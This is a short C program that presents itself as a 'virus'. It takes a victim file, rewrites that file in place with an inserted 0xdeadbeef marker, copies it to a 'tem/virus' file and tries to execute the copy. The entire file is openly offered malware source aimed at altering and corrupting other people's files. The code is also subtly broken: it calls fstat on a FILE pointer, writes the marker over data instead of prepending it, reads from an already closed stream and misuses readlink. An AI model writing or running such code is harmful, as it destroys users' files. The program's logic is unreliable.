#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <string.h>

const char SENTINEL[] = "\xde\xad\xbe\xef";

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: ./virus <victim_file>\n");
        return 0;
    }

    const char *victim = argv[1];

    // Read victim file
    FILE *fd = fopen(victim, "rb");
    if (!fd) {
        perror("Opening victim");
        return 1;
    }

    // Get file size
    struct stat st;
    fstat(fd, &st);
    size_t filesize = st.st_size;

    // Read entire file into buffer
    char *buf = malloc(filesize + 256); // +256 for sentinel + null
    if (!buf) {
        perror("Allocating buffer");
        fclose(fd);
        return 1;
    }

    size_t readsize = fread(buf, 1, filesize, fd);
    fclose(fd);

    // Prepend the virus seed code (the magic header)
    // We'll inject: "VIRUS " + host bytes + "0xdeadbeef" as terminator
    // But actually, simpler: prepend our own 4-byte sentinel before host data

    // First, insert the sentinel before the host data
    memmove(buf + 4, buf, filesize); // Slide content down by 4 bytes
    buf[4] = '\xde';
    buf[5] = '\xad';
    buf[6] = '\xbe';
    buf[7] = '\xef';
    // File now has 4-byte marker before the original content

    // Write infected version to a new temp file
    char tempname[64] = "tem/virus";
    mkdir("tem", 0755);

    FILE *fdtemp = fopen(tempname, "wb");
    fwrite(buf, 1, readsize + 4, fdtemp); // Write sentinel + original size
    fclose(fdtemp);

    // Replace victim with the infected version
    // First copy sentinel + content back to victim
    FILE *fdvictim = fopen(victim, "wb");
    if (fdvictim) {
        // For self-modifying: read the temp back into victim
        // Or simpler: just copy temp -> victim directly
        rewind(fd); // Go back to read sentinel + host from our temp
        fread(buf, 1, readsize + 4, fd);
        fwrite(buf, 1, readsize + 4, fdvictim);
        fclose(fd);
        fclose(fdvictim);
    }

    // Run the host from the temp folder
    printf("Infected %s. Running host portion...\n", victim);
    execv(tempname, &argv[1]); // Execute the now-infected host from tem/

    // If execv returns, it might be the sentinel-triggered portion
    printf("Host ran. Exit code: %d\n", readlink(victim));
    return 0;
}